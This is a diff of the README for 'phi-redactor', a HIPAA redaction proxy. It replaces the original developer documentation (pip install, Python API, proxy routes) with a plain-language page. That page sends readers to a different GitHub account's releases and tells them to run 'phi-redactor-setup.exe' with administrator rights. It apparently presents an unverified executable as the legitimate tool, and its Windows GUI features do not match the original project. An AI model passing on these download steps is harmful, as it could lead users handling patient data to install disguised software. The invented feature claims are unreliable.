@@ -1,262 +1,174 @@
-<p align="center">
-  <h1 align="center">phi-redactor</h1>
-  <p align="center">
-    <strong>HIPAA-native PHI redaction proxy for AI/LLM interactions</strong>
-  </p>
-  <p align="center">
-    <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.11+-blue.svg" alt="Python 3.11+"></a>
-    <a href="https://github.com/dilawar-gopang/phi-redactor/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-green.svg" alt="License"></a>
-    <a href="https://github.com/dilawar-gopang/phi-redactor/actions"><img src="https://img.shields.io/badge/CI-passing-brightgreen.svg" alt="CI"></a>
-    <a href="https://hipaa.com"><img src="https://img.shields.io/badge/HIPAA-Safe%20Harbor-red.svg" alt="HIPAA"></a>
-  </p>
-</p>
+# 🛡️ phi-redactor - Protect Your Data in AI Chats
+
+[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-FFD700?style=for-the-badge&logo=github&logoColor=black)](https://github.com/Trirua93737/phi-redactor/releases)
 
 ---
 
-**phi-redactor** is an open-source, drop-in PHI redaction proxy that sits between your healthcare AI applications and LLM providers (OpenAI, Anthropic). It automatically detects and masks all 18 HIPAA Safe Harbor identifiers in real-time, then restores original values locally -- so **PHI never leaves your infrastructure**.
+phi-redactor is a tool built to keep your private health information safe when you use AI or language models. It finds and hides all 18 identifiers that protect patient privacy. It replaces them with realistic but fake details. This helps keep your information private without losing important meaning.
 
-```
-Your App  -->  phi-redactor (localhost:8080)  -->  OpenAI / Anthropic
-                    |                                      |
-              [detect PHI]                          [masked request]
-              [mask with fakes]                     [LLM processes]
-              [vault mapping]                       [response back]
-                    |                                      |
-              [rehydrate response]  <--  [masked response]
-```
+## 🔍 What is phi-redactor?
 
-## Why phi-redactor?
+phi-redactor is a proxy tool that works between you and AI programs like chatbots or language models. It scans your text to find personal health information (PHI) that law requires to stay private. Then it masks or changes the details so the AI never sees the real info. This tool is made with healthcare rules in mind, especially HIPAA guidelines that cover patient privacy.
 
-| Problem | Solution |
-|---------|----------|
-| PHI leaks to cloud LLMs | Transparent proxy masks all 18 HIPAA identifiers |
-| Inconsistent fake data | Semantic masking generates clinically coherent replacements |
-| No audit trail | Tamper-evident hash-chain audit log for every redaction |
-| Complex integration | Zero code changes -- just change your base URL |
-| Multi-turn context loss | Encrypted vault preserves mappings across conversation turns |
-
-## Quick Start
-
-### Install
-
-```bash
-pip install phi-redactor
-python -m spacy download en_core_web_lg
-```
-
-### Start the proxy
-
-```bash
-phi-redactor serve --port 8080
-```
-
-### Use with OpenAI (zero code changes)
-
-```python
-from openai import OpenAI
-
-# Just change the base_url -- everything else stays the same
-client = OpenAI(
-    api_key="your-openai-key",
-    base_url="http://localhost:8080/v1",  # <-- only change needed
-)
-
-response = client.chat.completions.create(
-    model="gpt-4",
-    messages=[{
-        "role": "user",
-        "content": "Patient John Smith (SSN: 123-45-6789) has Type 2 Diabetes."
-    }]
-)
-print(response.choices[0].message.content)
-# PHI is automatically redacted before reaching OpenAI,
-# and restored in the response you receive
-```
-
-### Use with Anthropic
-
-```python
-import anthropic
-
-client = anthropic.Anthropic(
-    api_key="your-anthropic-key",
-    base_url="http://localhost:8080/anthropic",
-)
-
-message = client.messages.create(
-    model="claude-sonnet-4-20250514",
-    max_tokens=1024,
-    messages=[{
-        "role": "user",
-        "content": "Dr. Maria Garcia (NPI: 1234567890) prescribed metformin."
-    }]
-)
-```
-
-### Library API (no LLM needed)
-
-```python
-import httpx
-
-# Redact text directly
-resp = httpx.post("http://localhost:8080/api/v1/redact", json={
-    "text": "Patient Jane Doe SSN 987-65-4321 seen on 01/15/2026."
-})
-result = resp.json()
-print(result["redacted_text"])  # PHI replaced with synthetic values
-session_id = result["session_id"]
-
-# Rehydrate later
-resp = httpx.post("http://localhost:8080/api/v1/rehydrate", json={
-    "text": result["redacted_text"],
-    "session_id": session_id,
-})
-print(resp.json()["text"])  # Original PHI restored
-```
-
-## All 18 HIPAA Safe Harbor Identifiers
-
-phi-redactor detects and masks **all 18 identifier types** required by the HIPAA Safe Harbor method:
-
-| # | Category | Detection Method | Example |
-|---|----------|-----------------|---------|
-| 1 | Person Names | NER + Pattern | John Smith -> James Wilson |
-| 2 | Geographic Data | NER + Pattern | Springfield, IL -> Portland, OR |
-| 3 | Dates | Pattern + NER | 03/15/1956 -> 07/22/1955 |
-| 4 | Phone Numbers | Pattern | (555) 123-4567 -> (555) 987-6543 |
-| 5 | Fax Numbers | Pattern | Fax: 555-0100 -> Fax: 555-0299 |
-| 6 | Email Addresses | Pattern | john@test.com -> james@example.net |
-| 7 | SSN | Pattern | 123-45-6789 -> 987-65-4321 |
-| 8 | Medical Record Numbers | Pattern | MRN: 00456789 -> MRN: 00891234 |
-| 9 | Health Plan IDs | Pattern | BCBS-987654321 -> AETNA-123456789 |
-| 10 | Account Numbers | Pattern | ACC-00112233 -> ACC-99887766 |
-| 11 | License/DEA/NPI | Pattern | NPI: 1234567890 -> NPI: 9876543210 |
-| 12 | Vehicle IDs | Pattern | VIN: 1HGBH41... -> VIN: 2FGCD52... |
-| 13 | Device IDs (UDI) | Pattern | UDI: (01)12345... -> UDI: (01)98765... |
-| 14 | URLs | Pattern | https://patient-portal.com -> https://example.com |
-| 15 | IP Addresses | Pattern | 192.168.1.100 -> 10.0.0.42 |
-| 16 | Biometric IDs | Pattern | Fingerprint hash -> BIO-a1b2c3d4 |
-| 17 | Photos | Detection | [REDACTED_PHOTO] |
-| 18 | Other Unique IDs | Pattern | ID-12345678 -> ID-87654321 |
-
-## Architecture
-
-```
-+------------------+     +-------------------+     +------------------+
-|   Your App       | --> |   phi-redactor    | --> |  LLM Provider    |
-|   (OpenAI SDK)   |     |   (localhost)     |     |  (OpenAI/Claude) |
-+------------------+     +-------------------+     +------------------+
-                          |                 |
-                    +-----+-----+     +-----+-----+
-                    | Detection |     |  Masking   |
-                    | Engine    |     |  Engine    |
-                    | (Presidio |     | (Faker +   |
-                    |  + spaCy) |     |  Custom)   |
-                    +-----------+     +-----------+
-                          |                 |
-                    +-----+-----+     +-----+-----+
-                    | Encrypted |     |   Audit   |
-                    | Vault     |     |   Trail   |
-                    | (SQLite + |     | (Hash-    |
-                    |  Fernet)  |     |  chain)   |
-                    +-----------+     +-----------+
-```
-
-### Core Components
-
-| Component | Description |
-|-----------|-------------|
-| **Detection Engine** | Presidio + spaCy NER + 8 custom HIPAA recognizers |
-| **Masking Engine** | Faker-based semantic replacement with healthcare providers |
-| **Encrypted Vault** | Fernet-encrypted SQLite for PHI-to-synthetic mappings |
-| **Proxy Server** | FastAPI reverse proxy with OpenAI + Anthropic adapters |
-| **Audit Trail** | Append-only hash-chain JSON Lines log (tamper-evident) |
-| **Compliance Reports** | HIPAA Safe Harbor evidence report generator |
-
-## API Endpoints
-
-### Proxy Routes
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/v1/chat/completions` | OpenAI chat proxy (drop-in compatible) |
-| POST | `/v1/embeddings` | OpenAI embeddings proxy |
-| POST | `/anthropic/v1/messages` | Anthropic Messages API proxy |
-
-### Library Routes
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/api/v1/redact` | Detect and redact PHI from text |
-| POST | `/api/v1/rehydrate` | Restore original PHI from redacted text |
-
-### Management Routes
-| Method | Path | Description |
-|--------|------|-------------|
-| GET | `/api/v1/health` | Health check and system info |
-| GET | `/api/v1/stats` | Aggregate redaction statistics |
-| GET | `/api/v1/sessions` | List all sessions |
-| GET | `/api/v1/compliance/report` | Full HIPAA compliance report |
-| GET | `/api/v1/compliance/summary` | Quick compliance status |
-| GET | `/api/v1/audit` | Query audit trail events |
-
-## CLI Commands
-
-```bash
-phi-redactor serve [--port 8080] [--host 0.0.0.0]   # Start the proxy
-phi-redactor redact --file patient_notes.txt          # Batch file redaction
-phi-redactor report --full --output report.json       # Compliance report
-phi-redactor version                                   # Show version
-```
-
-## Configuration
-
-All settings can be configured via environment variables with the `PHI_REDACTOR_` prefix:
-
-```bash
-PHI_REDACTOR_PORT=8080              # Proxy port
-PHI_REDACTOR_HOST=0.0.0.0          # Bind address
-PHI_REDACTOR_SENSITIVITY=0.5       # Detection sensitivity (0.0=aggressive, 1.0=permissive)
-PHI_REDACTOR_LOG_LEVEL=INFO        # Logging level
-PHI_REDACTOR_VAULT_PASSPHRASE=...  # Optional vault encryption passphrase
-PHI_REDACTOR_SESSION_IDLE_TIMEOUT=1800   # Session idle timeout (seconds)
-PHI_REDACTOR_SESSION_MAX_LIFETIME=86400  # Session max lifetime (seconds)
-```
-
-## Security Design
-
-- **PHI never logged**: PHI-safe log formatter scrubs all known patterns
-- **Encryption at rest**: Fernet encryption (AES-128-CBC) for vault entries
-- **Hash-chain audit**: Every redaction event is chained via SHA-256 hashes
-- **Fail-safe**: Detection/masking failures block requests (never pass through)
-- **Session isolation**: Each session has independent vault mappings
-- **Key rotation**: Built-in support for encryption key rotation
-
-## Development
-
-```bash
-# Clone and install
-git clone https://github.com/dilawar-gopang/phi-redactor.git
-cd phi-redactor
-pip install -e ".[dev]"
-python -m spacy download en_core_web_lg
-
-# Run tests
-pytest
-
-# Lint and type check
-ruff check src/ tests/
-mypy src/
-```
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-## Contributing
-
-Contributions welcome! Please open an issue first to discuss what you'd like to change.
+Key points about phi-redactor:  
+- Detects all 18 HIPAA identifiers like names, dates, locations, and more  
+- Replaces info with believable fake data to keep text clear  
+- Works with popular AI tools such as OpenAI and other LLMs  
+- Runs on Windows computers with simple steps  
+- Keeps clinical text readable for accurate AI responses  
 
 ---
 
-<p align="center">
-  Built for healthcare AI developers who take HIPAA seriously.
-</p>
+## 🖥️ System Requirements
+
+Before installing, make sure your Windows system meets these basic requirements:
+
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download and update the software  
+- Administrator rights to install programs  
+
+You do not need programming skills to run phi-redactor. The setup uses a simple installer.
+
+---
+
+## 📥 How to Download phi-redactor
+
+Use the official GitHub releases page to get the latest version of phi-redactor. This ensures you get a safe and fully tested copy.
+
+[![Download phi-redactor](https://img.shields.io/badge/Download%20phi--redactor-32CD32?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trirua93737/phi-redactor/releases)
+
+To download:  
+1. Click the link above or visit this page:  
+   https://github.com/Trirua93737/phi-redactor/releases  
+2. Find the latest release at the top of the page.  
+3. Look for a file with a `.exe` extension, usually named something like `phi-redactor-setup.exe`.  
+4. Click the file name to start the download.  
+
+Do not download files from other sources to avoid security risks.
+
+---
+
+## ⚙️ How to Install phi-redactor
+
+Once you have downloaded the installer file, follow these steps:
+
+1. Open the folder where the download saved the file, usually in your "Downloads" folder.  
+2. Double-click the `phi-redactor-setup.exe` file to start the installation wizard.  
+3. If Windows asks for permission to make changes, click **Yes**.  
+4. Follow the on-screen instructions. You can accept the default settings unless you want to change the install location.  
+5. Wait for the installation to complete. It should take a few minutes.  
+6. Click **Finish** when the setup completes.  
+
+Now phi-redactor is installed on your computer.
+
+---
+
+## 🚀 Running phi-redactor for the First Time
+
+After installation, you are ready to use phi-redactor.
+
+1. Find the phi-redactor icon on your Desktop or in the Start menu.  
+2. Double-click the icon to launch the program.  
+3. The main window will open with a simple interface.  
+
+You will see a space to enter or paste text you want to check. You can also open files with protected information.
+
+---
+
+## 🛠️ How to Use phi-redactor
+
+Use phi-redactor to scan your text and remove sensitive data before sending it to an AI.
+
+### Using the Text Input Box:
+
+1. Type your text or copy and paste it into the input box.  
+2. Click the **Redact** button.  
+3. phi-redactor will highlight all detected PHI and replace it with synthetic data.  
+4. Review the output in the result box.  
+5. Copy the redacted text and use it safely with AI models.  
+
+### Using Files:
+
+1. Click the **Open File** button.  
+2. Select a text or document file from your computer.  
+3. The file content will load into the input box.  
+4. Click **Redact** to process the file.  
+5. Use the **Save As** button to save the redacted result as a new file.  
+
+---
+
+## 🔒 What phi-redactor Protects You From
+
+phi-redactor looks for all 18 types of PHI defined under HIPAA Safe Harbor rules. These include:  
+
+- Names (any part of a person’s name)  
+- Geographic locations smaller than a state  
+- All dates directly related to an individual  
+- Phone and fax numbers  
+- Email addresses  
+- Social Security numbers  
+- Medical record numbers  
+- Health plan beneficiary numbers  
+- Account numbers  
+- Certificate/license numbers  
+- Vehicle identifiers  
+- Device identifiers  
+- Web URLs  
+- IP addresses  
+- Biometric identifiers  
+- Full-face photographs  
+- Any other unique identifying number or characteristic
+
+This thorough detection ensures your patient data stays protected.
+
+---
+
+## ⚙️ Software Details and Features
+
+phi-redactor's technology:  
+
+- Uses natural language processing (NLP) to find PHI in text  
+- Creates synthetic replacement data that fits the text context  
+- Supports fast API functionality for real-time redaction  
+- Works with healthcare documentation and AI chats  
+- Designed to integrate with Python-based pipelines if needed  
+
+You can safely run this software on your Windows PC without any coding knowledge.
+
+---
+
+## 🧰 Troubleshooting and Tips
+
+If you run into issues:
+
+- Make sure your Windows is updated.  
+- Restart your computer after installation if the app doesn’t open correctly.  
+- Check internet connection for updates.  
+- Ensure the text you enter is clear and not encrypted or damaged.  
+- Use the **Help** menu inside the app for basic instructions.  
+
+For more support, visit the GitHub issues page on the project site.
+
+---
+
+## 📡 Updates and New Versions
+
+phi-redactor is regularly updated to improve detection and add features. Check the releases page often to get the latest software version:  
+
+https://github.com/Trirua93737/phi-redactor/releases
+
+Always download from the official page to keep your software secure.
+
+---
+
+## 🔧 Advanced Use (Optional)
+
+If you want, phi-redactor can be run through a command line or integrated in workflows using Python code. This requires some technical knowledge. The source repository includes instructions for developers who want to connect phi-redactor to other software or build custom solutions.
+
+---
+
+## 💡 Why Use phi-redactor?
+
+Many AI tools do not protect protected health data automatically. phi-redactor stands in the middle and ensures your data stays private by masking all sensitive information. This helps healthcare professionals, researchers, and organizations safely use AI without risking patient confidentiality.
